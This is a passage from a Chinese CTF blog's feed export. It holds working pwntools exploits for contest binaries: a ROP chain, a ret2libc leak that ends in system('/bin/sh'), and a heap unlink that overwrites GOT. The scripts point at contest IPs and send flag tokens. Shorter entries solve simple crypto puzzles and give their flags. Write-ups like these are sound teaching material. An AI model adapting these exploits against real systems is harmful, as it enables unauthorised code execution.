1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 0x000000000046fea5) # syscall ; ret< span><br><span class="line">return p</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn9")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">#0x401196</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">payload = 0x9*'a'</span><br><span class="line">b6 = base64.b64encode(payload)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(b6)</span><br><span class="line">sh.recvuntil("a" * 9)</span><br><span class="line">canary = u64('\x00' + sh.recv(7))</span><br><span class="line">sh.recvuntil("continue")</span><br><span class="line">sh.sendline("yes")</span><br><span class="line">payload = 0x8 * "a" + p64(canary)</span><br><span class="line">payload += 'a' * 8 + rop()</span><br><span class="line">b6 = base64.b64encode(payload)</span><br><span class="line">sh.sendline(b6)</span><br><span class="line">sh.recvuntil("continue")</span><br><span class="line"></span><br><span class="line">sh.sendline("no")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50009,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></pre></td></tr></tbody></table></figure></div><h2 id="0x3-於讴"><a href="#0x3-於讴" class="headerlink" title="0x3 於讴"></a>0x3 於讴</h2><h3 id="导入IDA，发现需要先绕过如下代码"><a href="#导入IDA，发现需要先绕过如下代码" class="headerlink" title="导入IDA，发现需要先绕过如下代码"></a>导入IDA，发现需要先绕过如下代码</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/15.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/15.png" class="lazyload"></a></p><h3 id="绕过方法很简单，输入大于0x3E7的数字即可"><a href="#绕过方法很简单，输入大于0x3E7的数字即可" class="headerlink" title="绕过方法很简单，输入大于0x3E7的数字即可"></a>绕过方法很简单，输入大于0x3E7的数字即可</h3><h3 id="绕过之后我们，就是典型的栈溢出了"><a href="#绕过之后我们，就是典型的栈溢出了" class="headerlink" title="绕过之后我们，就是典型的栈溢出了"></a>绕过之后我们，就是典型的栈溢出了</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/16.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/16.png" class="lazyload"></a></p><h3 id="允许read-0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露-libc-start-main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc-system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下"><a href="#允许read-0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露-libc-start-main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc-system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下" class="headerlink" title="允许read 0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露__libc_start_main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc_system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下"></a>允许read 0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露__libc_start_main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc_system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf1 = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc.so")</span><br><span class="line">pop_rdi_ret = 0x0000000000414fc3</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000414fc1</span><br><span class="line">sh.sendline(str(2000))</span><br><span class="line">sh.recvuntil("?")</span><br><span class="line">payload = 'a' * (0x10 + 8)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf1.got['__libc_start_main'])</span><br><span class="line">payload += p64(elf1.plt['puts'])</span><br><span class="line">payload += p64(0x4007C3)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system'] + 0x1b</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline(str(2000))</span><br><span class="line">        sh.recvuntil("?")</span><br><span class="line">payload = 'a' * (0x10 + 8)</span><br><span class="line">        payload += p64(pop_rdi_ret)</span><br><span class="line">        payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50006 ,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x4-正定"><a href="#0x4-正定" class="headerlink" title="0x4 正定"></a>0x4 正定</h2><h3 id="导入IDA，发现有一个shell函数"><a href="#导入IDA，发现有一个shell函数" class="headerlink" title="导入IDA，发现有一个shell函数"></a>导入IDA，发现有一个shell函数</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/17.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/17.png" class="lazyload"></a></p><h3 id="只要执行了这里就可以直接拿到shell"><a href="#只要执行了这里就可以直接拿到shell" class="headerlink" title="只要执行了这里就可以直接拿到shell"></a>只要执行了这里就可以直接拿到shell</h3><p>漏洞分析：edit功能存在堆溢出<br>利用方式：考虑到程序没有开启got保护和pie，且malloc来的指针位于bss段，所以考虑unlink，通过unlink可以使第一个ptr变成chunk_list – 0x18，这样edit的时候就可以再一次覆盖第一个堆块的指针，就可以实现任意地址写，然后我们把第一个堆块的指针覆盖为free.got这样就我们再edit一次第一个堆块就可以修改free.got的内容，将free.got的内容修改为shell函数的地址，然后free任意一个堆块，就可以执行system(“/bin/sh\x00”)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn14")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn14")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">chunk_list = 0x4040C0</span><br><span class="line">add(0x68,'\x11' * 0x68)</span><br><span class="line">add(0x80,'\x22' * 0x80)</span><br><span class="line">add(0x20,'\x33' * 0x20)</span><br><span class="line">payload = p64(0) + p64(0x61) + p64(chunk_list - 0x18) + p64(chunk_list - 0x10)</span><br><span class="line">payload = payload.ljust(0x60,'\x00')</span><br><span class="line">payload += p64(0x60) + p64(0x90)</span><br><span class="line">edit(0,0x80,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = '\xaa' * 0x18</span><br><span class="line">payload += p64(0x404018)</span><br><span class="line">edit(0,0x80,payload)</span><br><span class="line">edit(0,0x80,p64(0x40158C))</span><br><span class="line">free(0)</span><br><span class="line">#if debug == 1:</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline("./flag.sh 1DJB96JCF03SHB2GJ2S1M5LVOE8PTTB3")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.4",50014 ,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-19年网络与信息安全领域专项赛</title>
      <link href="/2019/08/26/CTF-19%E5%B9%B4%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/"/>
      <url>/2019/08/26/CTF-19%E5%B9%B4%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-Python沙盒逃逸</title>
      <link href="/2019/08/24/Pwn-Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
      <url>/2019/08/24/Pwn-Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="本文参考以下网站，进行重新排版整合"><a href="#本文参考以下网站，进行重新排版整合" class="headerlink" title="本文参考以下网站，进行重新排版整合"></a>本文参考以下网站，进行重新排版整合</h3><h3 id="https-www-chainnews-com-articles-151288323475-htm"><a href="#https-www-chainnews-com-articles-151288323475-htm" class="headerlink" title="https://www.chainnews.com/articles/151288323475.htm"></a><a href="https://www.chainnews.com/articles/151288323475.htm" target="_blank" rel="noopener">https://www.chainnews.com/articles/151288323475.htm</a></h3><h1 id="Python沙盒逃逸"><a href="#Python沙盒逃逸" class="headerlink" title="Python沙盒逃逸"></a>Python沙盒逃逸</h1><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><h2 id="Python2逃逸方式"><a href="#Python2逃逸方式" class="headerlink" title="Python2逃逸方式"></a>Python2逃逸方式</h2><h2 id="Python3逃逸方式"><a href="#Python3逃逸方式" class="headerlink" title="Python3逃逸方式"></a>Python3逃逸方式</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BUUCTF-Crypto刷题之旅-(1)</title>
      <link href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
      <url>/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-看我回旋踢"><a href="#0x01-看我回旋踢" class="headerlink" title="0x01 看我回旋踢"></a>0x01 看我回旋踢</h2><h3 id="题目：synt-5pq1004q-86n5-46q8-o720-oro5on0417r1"><a href="#题目：synt-5pq1004q-86n5-46q8-o720-oro5on0417r1" class="headerlink" title="题目：synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}"></a>题目：synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接考虑凯撒密码</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/1.png" class="lazyload"></a></p><h3 id="flag-5cd1004d-86a5-46d8-b720-beb5ba0417e1"><a href="#flag-5cd1004d-86a5-46d8-b720-beb5ba0417e1" class="headerlink" title="flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}"></a>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</h3><h2 id="0x02-MD5"><a href="#0x02-MD5" class="headerlink" title="0x02 MD5"></a>0x02 MD5</h2><h3 id="题目：e00cf25ad42683b3df678c61f42c6bda"><a href="#题目：e00cf25ad42683b3df678c61f42c6bda" class="headerlink" title="题目：e00cf25ad42683b3df678c61f42c6bda"></a>题目：e00cf25ad42683b3df678c61f42c6bda</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解法：</span><br><span class="line">https://www.cmd5.com/    直接解密</span><br><span class="line">原文: admin1</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-admin1"><a href="#flag-admin1" class="headerlink" title="flag{admin1}"></a>flag{admin1}</h3><h2 id="0x03-Url编码"><a href="#0x03-Url编码" class="headerlink" title="0x03 Url编码"></a>0x03 Url编码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按照题意，直接URL解码</span><br><span class="line">http://tool.chinaz.com/tools/urlencode.aspx</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-and-1-1"><a href="#flag-and-1-1" class="headerlink" title="flag{and 1=1}"></a>flag{and 1=1}</h3><h2 id="0x04-摩丝"><a href="#0x04-摩丝" class="headerlink" title="0x04 摩丝"></a>0x04 摩丝</h2><h3 id="题目：-—-…-–-—"><a href="#题目：-—-…-–-—" class="headerlink" title="题目：.. .-.. — …- . -.– — ..-"></a>题目：.. .-.. — …- . -.– — ..-</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按照题意，直接解密</span><br><span class="line">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-ILOVEYOU"><a href="#flag-ILOVEYOU" class="headerlink" title="flag{ILOVEYOU}"></a>flag{ILOVEYOU}</h3><h2 id="0x05-变异凯撒"><a href="#0x05-变异凯撒" class="headerlink" title="0x05 变异凯撒"></a>0x05 变异凯撒</h2><h3 id="题目：加密密文：afZ-r9VYfScOeO-UL-RWUc-格式：flag"><a href="#题目：加密密文：afZ-r9VYfScOeO-UL-RWUc-格式：flag" class="headerlink" title="题目：加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }"></a>题目：加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先用普通凯撒密码跑了一下，啥也没有</span><br><span class="line">然后根据flag格式，前五位为flag{</span><br><span class="line">可以推算出偏移，脚本如下：</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">s = 'afZ_r9VYfScOeO_UL^RWUc'</span><br><span class="line">flag = ''</span><br><span class="line">offset = 5</span><br><span class="line">for i in s:</span><br><span class="line">flag += str(chr(ord(i) + offset))</span><br><span class="line">offset += 1</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-Caesar-variation"><a href="#flag-Caesar-variation" class="headerlink" title="flag{Caesar_variation}"></a>flag{Caesar_variation}</h3><h2 id="0x06-Quoted-printable"><a href="#0x06-Quoted-printable" class="headerlink" title="0x06 Quoted-printable"></a>0x06 Quoted-printable</h2><h3 id="题目：-E9-82-A3-E4-BD-A0-E4-B9-9F-E5-BE-88-E6-A3-92-E5-93-A6"><a href="#题目：-E9-82-A3-E4-BD-A0-E4-B9-9F-E5-BE-88-E6-A3-92-E5-93-A6" class="headerlink" title="题目：=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6"></a>题目：=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度搜索 Quoted-printable</span><br><span class="line">http://web.chacuo.net/charsetquotedprintable</span><br></pre></td></tr></tbody></table></figure></div><p><a 